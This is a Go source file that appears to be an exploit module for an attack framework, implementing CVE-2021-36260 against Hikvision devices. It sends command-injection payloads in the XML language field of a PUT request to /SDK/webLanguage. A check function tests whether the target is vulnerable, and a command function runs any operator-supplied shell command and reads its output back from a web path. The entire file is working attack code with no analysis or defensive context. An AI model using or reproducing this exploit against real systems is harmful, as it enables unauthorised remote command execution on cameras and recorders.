package exp_hikvision

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Exp_CVE_2021_36260 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2021_36260) Attack_getmsg1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()
	headers.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	headers.Set("X-Requested-With", "XMLHttpRequest")

	expUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/SDK/webLanguage")
	echoUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/c")

	payload := `<?xml version="1.0" encoding="UTF-8"?>
<language>%s</language>
`
	cmd := fmt.Sprintf("$(>webLib/c)")
	payload = fmt.Sprintf(payload, cmd)

	httpresp := self.HttpPutWithoutRedirect(expUrl, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if strings.Contains(httpresp.Body, "</requestURL>") {
		self.EchoSuccessMsg("vul is maybe exist")
	} else if httpresp.Resp.StatusCode == 404 || httpresp.Body == "" {
		self.EchoErrMsg("do not looks like Hikvision")
		return
	}

	httpresp = self.HttpGetWithoutRedirect(echoUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	if httpresp.Resp.StatusCode != 200 {
		if httpresp.Resp.StatusCode == 500 {
			self.EchoErrMsg(fmt.Sprintf("Could not verify if vulnerable (Code: %s)", httpresp.Resp.Status))
		} else {
			self.EchoErrMsg(fmt.Sprintf("Remote is not vulnerable (Code: %s)", httpresp.Resp.Status))
		}
	} else {
		self.EchoSuccessMsg("Remote is verified exploitable")
	}

	return
}

func (self *Exp_CVE_2021_36260) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()
	headers.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	headers.Set("X-Requested-With", "XMLHttpRequest")

	expUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/SDK/webLanguage")
	echoUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/x")

	payload := `<?xml version="1.0" encoding="UTF-8"?>
<language>%s</language>
`
	cmd = fmt.Sprintf("$(%s>webLib/x)", cmd)
	payload = fmt.Sprintf(payload, cmd)

	httpresp := self.HttpPutWithoutRedirect(expUrl, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if strings.Contains(httpresp.Body, "</requestURL>") {
		self.EchoSuccessMsg("vul is maybe exist")
	}

	httpresp = self.HttpGetWithoutRedirect(echoUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("Error execute cmd " + cmd)
	} else {
		self.EchoSuccessMsg(httpresp.Body)
	}

	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_CVE_2021_36260{}, "exp_CVE_2021_36260.yml")

}
